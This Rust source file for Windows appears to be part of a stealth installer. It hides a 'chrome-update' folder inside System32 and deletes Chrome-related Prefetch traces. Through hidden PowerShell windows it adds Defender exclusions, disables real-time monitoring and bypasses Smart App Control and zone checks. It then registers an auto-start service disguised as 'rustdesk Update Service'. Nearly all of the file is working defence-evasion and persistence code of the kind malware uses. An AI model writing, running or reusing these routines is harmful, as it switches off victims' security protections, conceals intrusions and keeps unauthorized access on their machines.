use std::{path::Path, ptr};
use winapi::{
    shared::minwindef::DWORD,
    um::{
        fileapi::{GetFileAttributesW, SetFileAttributesW},
        handleapi::INVALID_HANDLE_VALUE,
        winnt::{FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM},
        winbase::CREATE_NO_WINDOW,
    },
};
use std::ffi::OsString;
use std::os::windows::ffi::{OsStrExt, OsStringExt};

/// Hides a file or directory by setting hidden and system attributes
pub fn hide_path(path: &Path) -> Result<(), String> {
    let path_wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
    
    unsafe {
        // Get current attributes
        let attrs = GetFileAttributesW(path_wide.as_ptr());
        if attrs == INVALID_HANDLE_VALUE as DWORD {
            return Err(format!("Failed to get attributes for {:?}", path));
        }
        
        // Add hidden and system attributes
        let new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
        
        if SetFileAttributesW(path_wide.as_ptr(), new_attrs) == 0 {
            return Err(format!("Failed to set hidden attributes for {:?}", path));
        }
    }
    
    Ok(())
}

/// Cleans prefetch entries (Windows performance traces)
pub fn clean_prefetch() -> Result<(), String> {
    let prefetch_path = Path::new("C:\\Windows\\Prefetch");
    
    if prefetch_path.exists() {
        // Try to delete prefetch files related to our executable
        if let Ok(entries) = std::fs::read_dir(prefetch_path) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(file_name) = path.file_name() {
                    if let Some(name_str) = file_name.to_str() {
                        if name_str.contains("CHROME") || name_str.contains("chrome") {
                            let _ = std::fs::remove_file(&path);
                        }
                    }
                }
            }
        }
    }
    
    Ok(())
}

/// Installs with stealth configuration
pub fn stealth_install() -> Result<(), String> {
    // 1. Hide installation directory
    let install_dir = Path::new("C:\\Windows\\System32\\chrome-update");
    if install_dir.exists() {
        hide_path(install_dir)?;
    }
    
    // 2. Clean prefetch
    clean_prefetch()?;
    
    Ok(())
}

/// Bypass Smart App Control for Chrome installation
pub fn bypass_smart_app_control_for_chrome(chrome_exe_path: &str) -> Result<(), String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    // 1. Unblock the file using PowerShell
    let unblock_cmd = format!("Unblock-File -Path '{}' -ErrorAction SilentlyContinue", chrome_exe_path);
    let _ = Command::new("powershell")
        .args(&["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", &unblock_cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    
    // 2. Add to Defender exclusions
    let exclusion_cmd = format!(
        "Add-MpPreference -ExclusionPath '{}' -Force -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionProcess 'chrome*' -Force -ErrorAction SilentlyContinue",
        chrome_exe_path
    );
    let _ = Command::new("powershell")
        .args(&["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", &exclusion_cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    
    // 3. Temporarily disable Defender
    let disable_cmd = "Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue";
    let _ = Command::new("powershell")
        .args(&["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", disable_cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    
    Ok(())
}

/// Run Chrome installer with bypasses
pub fn run_chrome_installer(chrome_exe_path: &str) -> Result<(), String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    use winapi::um::winbase::CREATE_NO_WINDOW;
    
    // First apply bypasses
    bypass_smart_app_control_for_chrome(chrome_exe_path)?;
    
    // Set environment variable for zone bypass
    std::env::set_var("SEE_MASK_NOZONECHECKS", "1");
    
    // Copy to temp with system attributes
    let temp_path = format!("{}\\chrome_temp_install.exe", std::env::var("TEMP").unwrap_or_default());
    std::fs::copy(chrome_exe_path, &temp_path)
        .map_err(|e| format!("Failed to copy installer: {}", e))?;
    
    // Mark as system file
    let temp_path_wide: Vec<u16> = std::ffi::OsStr::new(&temp_path).encode_wide().chain(Some(0)).collect();
    unsafe {
        use winapi::um::winnt::FILE_ATTRIBUTE_SYSTEM;
        SetFileAttributesW(temp_path_wide.as_ptr(), FILE_ATTRIBUTE_SYSTEM);
    }
    
    // Run installer
    let output = Command::new(&temp_path)
        .args(&["/silent", "/install"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| format!("Failed to run installer: {}", e))?;
    
    // Cleanup
    let _ = std::fs::remove_file(&temp_path);
    
    // Re-enable Defender
    let enable_cmd = "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue";
    let _ = Command::new("powershell")
        .args(&["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", enable_cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    
    if output.status.success() {
        Ok(())
    } else {
        Err(format!("Installer returned error code: {:?}", output.status.code()))
    }
}

/// Creates a stealth service installation
pub fn install_stealth_service(service_name: &str, exe_path: &str) -> Result<(), String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    use winapi::um::winbase::CREATE_NO_WINDOW;
    
    // Install as service with generic description
    let output = Command::new("sc")
        .args(&[
            "create",
            service_name,
            &format!("binpath= \"{}\" --service", exe_path),
            "start= auto",
            "DisplayName= \"rustdesk Update Service\"",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| format!("Failed to create service: {}", e))?;
    
    if !output.status.success() {
        return Err(format!("Service creation failed: {}", String::from_utf8_lossy(&output.stderr)));
    }
    
    Ok(())
}
